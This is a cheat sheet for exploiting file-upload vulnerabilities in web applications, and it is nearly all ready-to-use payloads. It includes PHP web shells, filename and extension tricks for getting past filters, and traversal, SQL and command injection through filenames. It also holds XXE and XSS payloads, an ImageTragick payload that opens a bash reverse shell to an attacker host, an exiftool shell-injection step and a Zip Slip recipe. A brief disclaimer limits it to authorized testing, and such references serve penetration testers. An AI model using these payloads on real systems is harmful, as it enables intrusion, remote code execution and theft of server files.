
# 🧨 File Upload Vulnerability Exploitation Cheatsheet

---

## 📍 Where to Find Upload Features

Look for:
- Profile photo uploads
- Resume submissions
- Avatar/image uploads
- Import/export functionality
- Upload from URL features

---

## 🎯 Common Exploitation Techniques

### 1. Change Content-Type Header
```http
POST /images/upload/ HTTP/1.1
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg
```

### 2. Change File Extension
```http
filename="shell.php.jpg"
Content-Type: application/x-php
```

### 3. Fake Image Header
```php
GIF89a;
<?php system("id"); ?>
```
Use `Content-Type: image/gif`

### 4. Short PHP Payload (Bypass Content-Length)
```php
<?=`$_GET[x]`?>
```

### 5. Null Byte Injection (Works on older PHP versions)
```
file.php%00.jpg
```

### 6. Double Extension
```
shell.jpg.php
```

### 7. Uncommon PHP Extensions
```
shell.phtml, shell.php5, shell.php4, shell.inc
```

### 8. Random Capitalization
```
shell.pHp, shell.PHP3
```

### 9. Combine All Techniques!

---

## 🔍 Upload File Extensions & Impacts

| Extension | Impact |
|----------|--------|
| `.php`, `.php5` | RCE, Webshell |
| `.svg` | XSS, SSRF, XXE |
| `.gif` | XSS, SSRF |
| `.csv` | CSV Injection |
| `.xml` | XXE |
| `.avi` | LFI, SSRF |
| `.html`, `.js` | XSS, Open Redirect |
| `.png`, `.jpg` | DoS (Pixel Flood) |
| `.zip` | Zip Slip, RCE |
| `.pdf`, `.pptx` | SSRF, Blind XXE |

---

## 🔓 Blacklisting Bypass Extensions

### PHP Variants
```
.phtm, .phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
```

### ASP Variants
```
.asp, .aspx, .asa, .cer
```

### JSP / ColdFusion
```
.jsp, .jspx, .jsw, .jsv, .jspf, .cfm, .cfml, .cfc, .dbm
```

### Capitalized Extensions
```
.pHP, .Php5, .PhAr
```

---

## ✅ Whitelist Bypass Tricks

```text
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php%20
file.php%0d%0a.jpg
file.php/
file.php.
file.php#.png
```

Use hex-edit to change `.phpD.jpg` → `.php .jpg`

---

## 🚨 Other Vulnerabilities via Upload

### 📁 Directory Traversal
```http
filename="../../../../etc/passwd"
filename="../../../logo.png"
```

### 🐚 SQL Injection
```http
filename="'sleep(10).jpg"
filename="sleep(10)-- -.jpg"
```

### ⚙️ Command Injection
```http
filename="; sleep 10;"
```

### 🌐 SSRF (Via URL upload or SVG)
```xml
<image xlink:href="http://127.0.0.1/admin" />
```

### 💣 ImageTragick (CVE-2016-3714)
```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1"|bash -i >& /dev/tcp/attacker/4444 0>&1)'
pop graphic-context
```

### 📦 XXE Payload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>
  <text>&xxe;</text>
</svg>
```

### 📄 XSS Payloads (Filename or content)
```html
<svg onload=alert(1)>
<script>alert(document.domain)</script>
filename="avatar.svg onload=alert(1)>"
```

### 🔁 Open Redirect
```xml
<svg onload="window.location='https://evil.com'"/>
```

---

## 🛡️ Content-Type and Length Bypass

### Fake Content-Type
```http
Content-Type: image/png
```

### Fake Content Body
```php
GIF89a;
<?=`$_GET[x]`?>
```

---

## 🧪 Miscellaneous Tricks

- `Exiftool` for injecting PHP payload in metadata:
```bash
mv pic.jpg shell.php.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.php.jpg
```

- Upload `.js`, `.config`, or `.web.config` files
- Pixel flood attack using massive image resolution
- Large filename DoS: `123456789...999.jpg`
- **Zip Slip**:
```bash
zip -r exploit.zip '../../../../../../var/www/html/shell.php'
```
Then access:
```
http://target/page.php?page=zip://path/to/exploit.zip%23shell.php
```

---

## ☠️ Use With Caution

This cheatsheet is for **educational and authorized penetration testing** only.

---

## 🧠 Bonus Tip

Always **analyze server responses**. Sometimes file is renamed but still accessible. Use tools like:
- `Burp Suite Repeater`
- `FFUF` for bruteforce discovery of uploaded files
- `Exiftool`, `Magic Bytes`, and `file` command for inspection

---

Happy Hacking! 🐚🔥
